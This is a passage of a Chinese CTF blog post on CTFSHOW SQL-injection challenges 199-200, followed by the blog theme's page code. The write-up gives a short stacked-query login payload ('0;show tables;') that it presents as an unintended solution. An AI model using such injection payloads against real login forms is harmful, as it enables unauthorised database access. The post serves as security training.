+<h2 id="web-199-200"><a href="#web-199-200" class="headerlink" title="web 199-200"></a>web 199-200</h2><p>感觉这个主要是出题的问题。好像190-200都能用这个通杀。</p>
+<p>因为这里作比较的主要是查询后的结果和传入的参数比较。又有row[0]的存在。</p>
+<p>因此我们可以使用这个非预期payload。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload:</span><br><span class="line">username:<span class="number">0</span>;show tables;</span><br><span class="line">password:ctfshow_user</span><br></pre></td></tr></table></figure>
+
+
+<p><img "" class="lazyload placeholder" data-original="https://i.loli.net/2021/09/19/fNJ479CkicMsFST.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif"></p>
+
+      </div>
+      <div class="post-tags-categories">
+        
+        <div class="tags">
+          
+            <a href="/tags/CTF-web/" class="">
+              CTF-web
+            </a>
+          
+        </div>
+        
+      </div>
+      
+        <div class="copyright">
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+    <strong>作者:  </strong>k1he</a>
+    </li>
+    <li class="post-copyright-link">
+    <strong>文章链接:  </strong>
+    <a href="/2021/09/19/CTFSHOW sql注入(一)/" target="_blank" title="CTFSHOW-sql注入(一)">https://k1he.github.io/2021/09/19/CTFSHOW sql注入(一)/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明:   </strong>
+      本网站所有文章除特别声明外,均采用 <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">CC BY-NC-ND 4.0</a>
+      许可协议。转载请注明出处!
+    </li>
+  </ul>
+<div>
+      
+    </article>
+    <!-- 上一篇文章和下一篇文章 -->
+    
+      <!-- 文章详情页的上一页和下一页 -->
+<div class="post-nav">
+
+
+
+
+
+  
+  <div class="post-nav-next post-nav-item">
+    <div class="post-nav-img lazyload" data-original="/medias/10.jpg" style="background-size: cover; 
+      background-position: center center;">
+    </div>
+    <a href="/2021/09/16/PHP%E4%B8%AD%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E4%B8%8E%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/" class="post-nav-link">
+      <div class="title">
+        下一篇: <i class="fa fa-angle-right"></i>
+        <div class="title-text">PHP中的命令执行与代码执行</div>
+      </div>
+      <!-- <div class="content">
+        PHP中的命令执行与代码执行最近在复习之前学过得知识点。因为之前是0基础来学习的，所以很多东西可能是没有弄懂的。现在重新
+      </div> -->
+    </a>
+  </div>
+
+</div>
+
+    
+    
+
+    <!-- 打赏 -->
+    
+      <div id="appDonate" class="post-donate">
+  <div id="donate_board" class="donate_bar center" ref="donate">
+    <a id="btn_donate" class="btn_donate" href="javascript:;" title="打赏" @click="showDialogDrawer()"></a>
+  </div>
+  <transition name="fade">
+    <div 
+      class="donate-box-mask"
+      v-cloak 
+      v-if="visible"
+      @click="cancelDialogDrawer()"
+    >
+    </div>
+  </transition>
+  <transition name="bounce">
+    <div class="donate-box" v-cloak v-if="visible">
+      <div class="donate-box_close">
+        <i class="fa fa-times" aria-hidden="true" @click="cancelDialogDrawer" pointer></i>
+      </div>
+      <div class="donate-box_title">
+        <h4>
+          你的赏识是我前进的动力
+        </h4>
+      </div>
+      <div class="donate-box_tab">
+        <div class="Alipay" pointer :class="{'active': tabActive === 'Alipay'}" @click="changeTabActive('Alipay')">
+          支付宝
+        </div>
+        <div class="WeChatpay" pointer :class="{'active': tabActive === 'WeChatpay'}" @click="changeTabActive('WeChatpay')">
+          微信
+        </div>
+      </div>
+      <div class="donate-box_img">
+        <div class="AlipayImg" v-if="tabActive === 'Alipay'">
+          <img src="/medias/zfb.JPG" alt="支付宝打赏" />
+        </div> 
+        <div class="WeChatpayImg" v-if="tabActive === 'WeChatpay'">
+          <img src="/medias/wx.JPG" alt="微信打赏" />
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDonate',
+    data: {
+      visible: false,
+      tabActive: 'Alipay',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        // function getScroll() {
+        //   return {
+        //     left: window.pageXOffset || document.documentElement.scrollLeft || document.body.scrollLeft || 0,
+        //     top: window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0
+        //   };
+        // }
+        this.top = $(document).scrollTop() // or getScroll().top
+        // console.log('aa', $('.main-content'));
+        body.style.cssText = 'overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+      changeTabActive(name) {
+        this.tabActive = name;
+      }
+    },
+    created() {}
+  })
+</script>
+    
+
+    <!-- 分享 -->
+    
+      <!-- https://github.com/overtrue/share.js -->
+<!-- 文章详情页的分享 -->
+<div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+
+<script src="/js/shareJs/social-share.min.js"></script>
+</script>
+
+<style>
+  .social-share {
+    margin: 20px 0;
+  }
+</style>
+
+
+    
+    
+    <!-- 评论 -->
+    <!-- 评论 -->
+
+  <div id="myComment">
+    
+      
+<section id="comments" style="padding: 1em; margin: 15px auto;"
+	class="animated bounceInUp">
+	<div id="vcomment" class="comment"></div>
+</section>
+<style>
+	#comments {
+		background: rgba(255,255,255,0.9);
+	}
+	#veditor {
+		background-image: url('https://img.zcool.cn/community/01a253594c71cfa8012193a329a77f.gif');
+		background-size: contain;
+		background-repeat: no-repeat;
+		background-position: right;
+		background-color: rgba(255, 255, 255, 0);
+		resize: vertical;
+	}
+	#veditor:focus{
+		background-position-y: 200px;
+		transition: all 0.2s ease-in-out 0s;
+	}
+	#vcomment .vcards .vcard .vh .vhead .vtag.vvisitor {
+		background-color: #42b983;
+	}
+	.v[data-class=v] .vbtn:active, .v[data-class=v] .vbtn:hover {
+		color: #42b983;
+		border-color: #42b983;
+	}
+	#vcomment .vcards .vcard .vhead .vsys i {
+		display: none;
+	}
+	/* 底部valine链接 */
+	#vcomment .vpower {
+		display: none;
+	}
+	
+	/* 底下注释是修改 名称和邮箱和网址输入框的样式 */
+	/* #vcomment .vheader {
+		display: flex;
+		justify-content: space-around;
+	}
+	
+	#vcomment .vheader .vnick {
+		width: 31%;
+		border: 2px solid #dedede;
+		padding-left: 10px;
+		padding-right: 10px;
+		border-radius: 5px
+	}
+
+	#vcomment .vheader .vmail {
+		width: 31%;
+		border: 2px solid #dedede;
+		padding-left: 10px;
+		padding-right: 10px;
+		border-radius: 5px
+	}
+
+	#vcomment .vheader .vlink {
+		width: 31%;
+		border: 2px solid #dedede;
+		padding-left: 10px;
+		padding-right: 10px;
+		border-radius: 5px
+	} */
+
+	img.vimg {
+		transition: all 1s;
+		/* 头像旋转时间为 1s */
+	}
+
+	img.vimg:hover {
+		transform: rotate(360deg);
+		-webkit-transform: rotate(360deg);
+		-moz-transform: rotate(360deg);
+		-o-transform: rotate(360deg);
+		-ms-transform: rotate(360deg);
+	}
+
+	#vcomment .vcards .vcard {
+		padding: 15px 20px 0 20px;
+		border-radius: 10px;
+		margin-bottom: 15px;
+		box-shadow: 0 0 4px 1px rgba(0, 0, 0, .12);
+		transition: all .3s
+	}
+
+	#vcomment .vcards .vcard:hover {
+		box-shadow: 0 0 8px 3px rgba(0, 0, 0, .12)
+	}
+
+	#vcomment .vcards .vcard .vh .vcard {
+		border: none;
+		box-shadow: none;
+	}
+</style>
+    
+  </div>
+
+<!-- comment script in themes\hexo-theme-bamboo\layout\_partial\scripts\index.ejs -->
+
+
+  </div>
+
+  <!-- 目录 -->
+  <!-- 文章详情页右侧目录 -->
+
+  <div class="toc-aside">
+    <div class="toc-main">
+      <div class="toc-aside-title">
+        <i class="fa fa-list-ul" aria-hidden="true"></i><span>本文目录</span>
+        
+          <div class="toc-open-close">本文目录</div>
+        
+      </div>
+      <div class="toc-content">
+        <div class="toc"></div>
+      </div>
+    </div>
+  </div>
+  <!-- js在scripts目录下的的toc.ejs里面 -->
+  
+
+  <script>
+    function openBtnClickFn () {
+      let openOrCloseBtn = $('.toc-aside .toc-aside-title .toc-open-close');
+      let open = eval('' || 'true');
+      openOrCloseBtn.click(function() {
+        if (open === true) {
+          $(".toc-aside").css({'width': 0, 'padding': 0});
+          $(".toc-content").css({'width': 0});
+          $(".toc-aside-title span, .toc-aside-title i").css({'display': 'none'});
+          $(".main-content").css({'width': '75%', 'margin': '10px auto'});
+          open = false;
+        } else {
+          $(".toc-aside").css({'width': '300px', 'padding': '0 10px'});
+          $(".toc-content").css({'width': '300px'});
+          $(".toc-aside-title span, .toc-aside-title i").css({'display': 'inline-block'});
+          $(".main-content").css({'width': '65%', 'margin-right': '10px', 'margin-left': 'calc(35% - 350px)'});
+          open = true;
+        }
+      });
+    };
+    openBtnClickFn();
+    document.addEventListener('pjax:complete', function () {
+      openBtnClickFn();
+    })
+  </script>
+
+
+  
+
+  <!-- 图片放大 Wrap images with fancybox support -->
+  <script src="/js/wrapImage.js"></script>
+</div>
+
+<!-- 文章详情页背景图 -->
+<div id="appBgSwiper" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -2;" :style="{'background-color': bgColor ? bgColor : 'transparent'}">
+    <transition-group tag="ul" :name="names">
+        <li v-for='(image,index) in img' :key='index' v-show="index === mark" class="bg-swiper-box">
+            <img :src="image" class="bg-swiper-img">
+        </li>
+    </transition-group>
+</div>
+<script>
+    var vm = new Vue({
+        el: '#appBgSwiper',
+        data: {
+            names: '' || 'fade' || 'fade', // translate-fade fade
+            mark: 0,
+            img: [],
+            bgColor: '',
+            time: null
+        },
+        methods: {   //添加方法
+            change(i, m) {
+                if (i > m) {
+                    // this.names = 'fade';
+                } else if (i < m) {
+                    // this.names = 'fade';
+                } else {
+                    return;
+                }
+                this.mark = i;
+            },
+            prev() {
+                // this.names = 'fade';
+                this.mark--;
+                if (this.mark === -1) {
+                    this.mark = 3;
+                    return
+                }
+            },
+            next() {
+                // this.names = 'fade';
+                this.mark++;
+                if (this.mark === this.img.length) {
+                    this.mark = 0;
+                    return
+                }
+            },
+            autoPlay() {
+                // this.names = 'fade';
+                this.mark++;
+                if (this.mark === this.img.length) {
+                    this.mark = 0;
+                    return
+                }
+            },
+            play() {
+                let bgImgDelay = '' || '180000'
+                let delay = parseInt(bgImgDelay) || 180000;
+                this.time = setInterval(this.autoPlay, delay);
+            },
+            enter() {
+                clearInterval(this.time);
+            },
+            leave() {
+                this.play();
+            }
+        },
+        created() {
+            this.play()
+        },
+        beforeDestroy() {
+            clearInterval(this.time);
+        },
+        mounted() {
+            let prop = ''|| '';
+            let isImg = prop.includes('.bmp') || prop.includes('.jpg') || prop.includes('.png') || prop.includes('.tif') || prop.includes('.gif') || prop.includes('.pcx') || prop.includes('.tga') || prop.includes('.exif') || prop.includes('.fpx') || prop.includes('.psd') || prop.includes('.cdr') || prop.includes('.pcd') || prop.includes('.dxf') || prop.includes('.ufo') || prop.includes('.eps') || prop.includes('.ai') || prop.includes('.raw') || prop.includes('.WMF') || prop.includes('.webp') || prop.includes('.jpeg') || prop.includes('http://') || prop.includes('https://') 
+            if (isImg) {
+                let img = prop.split(',');
+                let configRoot = '/'
+                let arrImg = [];
+                img.forEach(el => {
+                    var Expression=/http(s)?:\/\/([\w-]+\.)+[\w-]+(\/[\w- .\/?%&=]*)?/;
+			        var objExp = new RegExp(Expression);
+
+                    if(objExp.test(el)) {
+                        // http or https
+                        arrImg.push(el);
+                    } else {
+                        // 非http or https开头
+                        // 本地文件
+                        let firstStr = el.charAt(0);
+                        if (firstStr == '/') {
+                            el = el.substr(1); // 删除第一个字符 '/',因为 configRoot最后一个字符为 /
+                        }
+                        el = configRoot + el;
+                        arrImg.push(el);
+                    }
+                })
+                this.img = arrImg;
+            } else {
+                this.bgColor = prop;
+            }
+        }
+    })
+</script>
+
+<style>
+    .bg-swiper-box {
+        position: absolute;
+        display: block;
+        width: 100%;
+        height: 100%;
+    }
+    .bg-swiper-img {
+        object-fit: cover;
+        width: 100%;
+        height: 100%;
+    }
+</style>
+
+      </main>
+    </div>
+
+    <!-- 页脚 -->
+    
+  
+  <div class="footer bg-color">
+    <div class="footer-main">
+      
+        
+          <div class="link">
+            
+              
+                <a href="/atom.xml" class="social">
+                  
+                    <i class="fa fa-rss" aria-hidden="true"></i>
+                  
+                </a>
+              
+            
+              
+                <a href="mailto:1021245006@qq.com" class="social">
+                  
+                    <i class="fa fa-envelope" aria-hidden="true"></i>
+                  
+                </a>
+              
+            
+              
+                <a target="_blank" rel="noopener" href="https://github.com/a1021245006" class="social">
+                  
+                    <i class="fa fa-github" aria-hidden="true"></i>
+                  
+                </a>
+              
+            
+              
+                <a href="tencent://AddContact/?fromId=50&amp;fromSubId=1&amp;subcmd=all&amp;uin=1730241541" class="social">
+                  
+                    <i class="fa fa-qq" aria-hidden="true"></i>
+                  
+                </a>
+              
+            
+          </div>
+        
+      
+        
+          <div class="footer-copyright">
+            <p>Copyright © 2019 - 2020 <a target="_blank" rel="noopener" href="https://github.com/a1021245006">k1he</a> | Powered by <a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">Hexo</a> | Theme <a target="_blank" rel="noopener" href="https://github.com/yuang01/theme">Bamboo</a> </p>
+
+          </div>
+        
+      
+        
+          
+            <!-- 不蒜子统计 -->
+            <!-- 不蒜子统计 -->
+<span id="busuanzi_container_site_pv">
+      <i class="fa fa-eye" aria-hidden="true"></i>本站总访问量：<span id="busuanzi_value_site_pv"></span> 次
+</span>
+<span class="post-meta-divider">|</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+      <i class="fa fa-users" aria-hidden="true"></i>本站访客数：<span id="busuanzi_value_site_uv"></span> 人
+</span>
+
+          
+        
+      
+        
+          <div class="footer-custom">
+            
+          </div>
+        
+      
+    </div>
+  </div>
+
+
+
+    <!-- 渲染暗黑按钮 -->
+    
+      <div class="dark">
+  <div class="dark-content">
+    <i class="fa fa-moon-o" aria-hidden="true"></i>
+    <!-- <span>关灯</span> -->
+  </div>
+  
+</div>
+
+<script>
+  $(function() {
+    let isDark = JSON.parse(localStorage.getItem('dark'))  || JSON.parse('false');
+    if (isDark) {
+      $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fa fa-lightbulb-o" aria-hidden="true"></i>
+          </div>
+          `
+        );
+    }
+    $('.dark').click(function() {
+      if ($(document.body).is('.darkModel')) {
+        $(document.body).removeClass('darkModel');
+        localStorage.setItem('dark', false);
+        $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fa fa-moon-o" aria-hidden="true"></i>
+          </div>
+          `
+        );
+      } else {
+        $(document.body).addClass('darkModel');
+        localStorage.setItem('dark', true);
+        $(".dark-content").replaceWith(
+          `
+          <div class='dark-content'>
+            <i class="fa fa-lightbulb-o" aria-hidden="true"></i>
+          </div>
+          `
+        );
+      }
+    })
+  })
+</script>
+    
+    <!-- 渲染回到顶部按钮 -->
+    
+      <div class="goTop top-btn-color" pointer>
+  <i class="fa fa-arrow-up" aria-hidden="true"></i>
+</div>
+<script src="/js/goTop.js"></script>
+    
+    <!-- 渲染左下角音乐播放器 -->
+    
+      <link rel="stylesheet" href="/js/aplayer/APlayer@1.10.1.min.css">
+<style>
+.aplayer .aplayer-lrc p {
+  
+  font-size: 12px;
+  font-weight: 700;
+  line-height: 16px !important;
+}
+
+.aplayer .aplayer-lrc p.aplayer-lrc-current {
+  
+  font-size: 15px;
+  color: #42b983;
+}
+
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+  left: -66px !important;
+}
+
+.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+  left: 0px !important;
+}
+
+
+</style>
+<meting-js  
+  class=""
+  server="tencent"
+  type="playlist"
+  id="8062553743"
+  fixed='true'
+  autoplay='false'
+  theme='#42b983'
+  loop='all'
+  order='random'
+  preload='auto'
+  volume='0.7'
+  list-folded='true'
+>
+</meting-js>
+
+<!-- <style>
+  #aplayer {
+    position: fixed;
+    left: 0;
+    bottom: 300px;
+  }
+</style> -->
+<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>
+    
+
+    <!-- 图片放大 -->
+    
+      <script src="/js/fancybox/jquery.fancybox.min.js"></script>
+    
+
+    <!-- 百度解析 -->
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    <!-- 背景彩带 -->
+    
+      <script type="text/javascript" size="100" alpha='0.4' zIndex="-1" src="/js/ribbon.min.js"></script>
+    
+    
+    <script src="/js/app.js" data-pjax></script>
+    
+    <!-- 文章目录所需js -->
+<link href="/js/tocbot/tocbot.css" rel="stylesheet">
+<script src="/js/tocbot/tocbot.min.js"></script>
+
+<script>
+  var headerEl = 'h2, h3, h4',  //headers 
+      content = '.post-detail',//文章容器
+      idArr = {};  //标题数组以确定是否增加索引id
+      //add #id
+  var option = {
+    // Where to render the table of contents.
+    tocSelector: '.toc',
+    // Where to grab the headings to build the table of contents.
+    contentSelector: content,
+    // Which headings to grab inside of the contentSelector element.
+    headingSelector: headerEl,
+    scrollSmooth: true,
+    scrollSmoothOffset: -80,
+    headingsOffset: -($(window).height() * 0.4 - 45),
+    positionFixedSelector: '.toc-main',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto',
+  }
+  if ($('.toc').length > 0) {
+
+    $(content).children(headerEl).each(function () {
+      //去除空格以及多余标点
+      var headerId = $(this).text().replace(/[\s|\~|`|\!|\@|\#|\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\||\|\[|\]|\{|\}|\;|\:|\"|\'|\,|\<|\.|\>|\/|\?|\：|\，|\。]/g, '');
+
+      headerId = headerId.toLowerCase();
+      if (idArr[headerId]) {
+        //id已经存在
+        $(this).attr('id', headerId + '-' + idArr[headerId]);
+        idArr[headerId]++;
+      }
+      else {
+        //id未存在
+        idArr[headerId] = 1;
+        $(this).attr('id', headerId);
+      }
+    });
+
+    tocbot.init(option);
+    
+  }
+
+
+  document.addEventListener('pjax:send', function () {
+    if ($('.toc').length) {
+      tocbot.destroy();
+    }
+  });
+
+  document.addEventListener('pjax:complete', function () {
+    if ($('.toc').length) {
+      tocbot.init(option);
+    }
+  });
+
+  
+</script>
+
+<style>
+.is-position-fixed {
+  position:sticky !important;
+  top: 74px;
+}
+.toc-main ul {
+  counter-reset: show-list;
+}
+.toc-main ul li::before {
+  content: counter(item)".";
+  display: block;
+  position: absolute;
+  left: 12px;
+  top:0;
+}
+/* .toc > .toc-list {
+  padding-left: 35px;
+}
+.toc>.toc-list li {
+  list-style: decimal;
+}
+.toc-list {
+  padding-left: 25px;
+} */
+</style> 
+
+<!-- 渲染issues标签里的内容 -->
+<script>
+  function loadIssuesJS() {
+    if ($(".post-detail").find(".issues-api").length == 0) {
+      return;
+    } 
+    loadScript('/js/issues/index.js');
+  };
+  $(function () {
+    loadIssuesJS();
+  });
+  document.addEventListener('pjax:complete', function () {
+    if (typeof IssuesAPI == "undefined") {
+      loadIssuesJS();
+    }
+  })
+</script>
+
+<!-- 输入框打字特效 -->
+<!-- 输入框打字特效 -->
+
+  <script src="/js/activate-power-mode.js"></script>
+  <script>
+    POWERMODE.colorful = true;  // 打开随机颜色特效
+    POWERMODE.shake = false;    // 关闭输入框抖动
+    document.body.addEventListener('input', POWERMODE);//监听打字事件
+  </script>
+
+
+<!-- markdown代码一键复制功能 -->
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/v-plugs-ayu/lib/ayu.css">
+  <script src="https://cdn.jsdelivr.net/npm/v-plugs-ayu/lib/ayu.umd.min.js"></script>
+  <script src="/js/clipboard/clipboard.min.js"></script>
+  <div id="appCopy">
+  </div>
+  <script data-pjax>
+    var vm = new Vue({
+      el: '#appCopy',
+      data: {
+      },
+      computed: {
+      },
+      mounted() {
+        const that = this;
+        var copy = '复制';
+        /* code */
+        var initCopyCode = function () {
+          var copyHtml = '';
+          copyHtml += '<button class="btn-copy" data-clipboard-snippet="" style="position:absolute;top:0;right:0;z-index:1;">';
+          copyHtml += '<i class="fa fa-copy"></i><span>' + copy + '</span>';
+          copyHtml += '</button>';
+          $(".post-detail pre").not('.gutter pre').wrap("<div class='codeBox' style='position:relative;width:100%;'></div>")
+          $(".post-detail pre").not('.gutter pre').before(copyHtml);
+          new ClipboardJS('.btn-copy', {
+            target: function (trigger) {
+              return trigger.nextElementSibling;
+            }
+          });
+        }
+        initCopyCode();
+        $('.btn-copy').unbind('click').bind('click', function () {
+          doSomething();
+        })
+        $(document).unbind('keypress').bind('keypress', function (e) {
+          if (e.ctrlKey && e.keyCode == 67) {
+            doSomething();
+            // 返回false, 防止重复触发copy事件  
+            // return false;
+          }
+        })
+        //  监听 ctrl + c事件  
+        // $(document).unbind('keypress').bind('keypress', function (e) {
+        //   if (e.ctrlKey && e.keyCode == 67) {
+        //     doSomething();
+        //     // 返回false, 防止重复触发copy事件  
+        //     return false;
+        //   }
+        // })
+
+        // // 鼠标右键的复制事件  
+        // $(document).unbind('copy').bind('copy', function (e) {
+        //   doSomething();
+        // });
+
+        function doSomething() {
+          that.$notify({
+            title: "成功",
+            content: "代码已复制，请遵守相关授权协议。",
+            type: 'success'
+          })
+        }
+      },
+      methods: {
+      },
+      created() { }
+    })
+  </script>
+
+
+<!-- 图片懒加载 -->
+<script src="/js/lazyload/lazyload@1.9.1.js"></script>
+<script data-pjax>
+  $(function () {
+    $("div.lazyload, img.lazyload, a.lazyload").lazyload(
+      {
+        effect: "show",
+        placeholder: "https://img10.360buyimg.com/ddimg/jfs/t1/159345/8/2271/222193/5ff7b36fEe49f5663/a95287c20385127f.gif"    //图片未加载出来时显示的占位图
+      }
+    );
+  });
+</script>
+
+<!-- 卡片滚动动画 -->
+   
+
+<!-- 评论所需js -->
+
+    
+        <!-- 弹幕所需的css和js -->
+        
+<!-- 具体js，请前往valine/script.ejs查看 -->
+
+        <script>
+  var requiredFields = '';
+  requiredFields = requiredFields.split(',');
+  comment_el = '.comment';
+  let looperValine = null;
+  load_valine = function () {
+    if ($(comment_el).length) {
+      var valine = new Valine({
+        el: '#vcomment',
+        path: window.location.pathname,
+        notify: false,
+        verify: false,
+        app_id: "",
+        app_key: "",
+        placeholder: "客官，说点什么吧",
+        avatar: "",
+        master: "",   //博主邮箱md5
+        tagMeta: ["博主","小伙伴","访客"],     //标识字段名
+        friends: "",
+        metaPlaceholder: { "nick": "昵称/QQ号", "mail": "邮箱" },
+        requiredFields: requiredFields,
+        enableQQ: true,
+      });
+      function debounce(fn) {
+        var timerID = null
+        return function () {
+          var arg = arguments[0]   //获取事件
+          if (timerID) {
+            clearTimeout(timerID)
+          }
+          timerID = setTimeout(function () {
+            fn(arg)              //事件传入函数
+          }, 200)
+        }
+      }
+      //查询评论 valine.Q('*').limit(7) -- 查询所有，限制7条, 下面的的代码是查询当前页面
+      var themeDanmu = eval('false');
+      var themeLoop = eval('false');
+      var themeLooperTime = '5000' || 5000;
+      var speed = '40' || 20;
+      var isBarrager = true;
+      if (themeDanmu == true) {
+        do_barrager();
+        if ($('.danmuBox').length <= 0) {
+          $('.navbar').append('<div class="danmuBox"><div class="danmuBtn open"><span class="danmuCircle"></span><span class="danmuText">弹幕</span></div></div>');
+        }
+        $('.danmuBtn').on('click', debounce(
+          function () {
+            if ($('.danmuBtn').hasClass('open')) {
+              $('.danmuBtn').removeClass('open')
+              clearInterval(looperValine);
+              $.fn.barrager.removeAll();
+            } else {
+              $('.danmuBtn').addClass("open");
+              do_barrager();
+            }
+          }
+        ))
+      }
+      function do_barrager() {
+        isBarrager && valine.Q(window.location.pathname).find().then(function (comments) {
+          // var num = 0; // 可以记录条数，循环调用的时候只取最新的评论放入弹幕中
+          var run_once = true;
+          var looper_time = themeLooperTime;
+          var total = comments.length;
+          // var looper = null;
+          var index = 0;
+          if (total > 0) {
+            barrager();
+          } else {
+            // 当评论数为0的时候，自动关闭弹幕
+            // $('.danmuBtn').removeClass('open');
+          }
+          function barrager() {
+            if (run_once) {
+              //如果是首次执行,则设置一个定时器,并且把首次执行置为false
+              looperValine = setInterval(barrager, looper_time);
+              run_once = false;
+            }
+            var content = comments[index]._serverData.comment;
+            var email = comments[index]._serverData.mail;
+            var link = comments[index]._serverData.link;
+            var newcontent = content.substring(0, 50).replace(/<[^>]+>/g, "");
+            //发布一个弹幕
+            const item = {
+              img: `https://q1.qlogo.cn/g?b=qq&nk=${email}&s=640`, //图片 
+              info: newcontent, //文字 
+              href: link, //链接 
+              close: true, //显示关闭按钮 
+              speed: speed, //延迟,单位秒,默认6 
+              color: '#fff', //颜色,默认白色 
+              old_ie_color: '#000000', //ie低版兼容色,不能与网页背景相同,默认黑色
+            }
+            $('body').barrager(item);
+            //索引自增
+            index++;
+            //所有弹幕发布完毕，清除计时器。
+            if (index == total) {
+              clearInterval(looperValine);
+              if (themeLoop === true) {
+                setTimeout(function () {
+                  do_barrager();
+                }, 5000);
+              } else {
+                $('.danmuBtn').removeClass('open');
+              }
+              return false;
+            }
+
+          }
+        })
+      }
+    }
+  };
+  $(document).ready(load_valine);
+  document.addEventListener('pjax:send', function (e) {
+    
+  })
+  document.addEventListener('pjax:complete', function () {
+    load_valine();
+  });
+</script>
+    
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+	 
+		<script src="/js/cursor/clicklove.js"></script> 
+	
+
+
+
+
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" data-pjax></script>
+
+
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
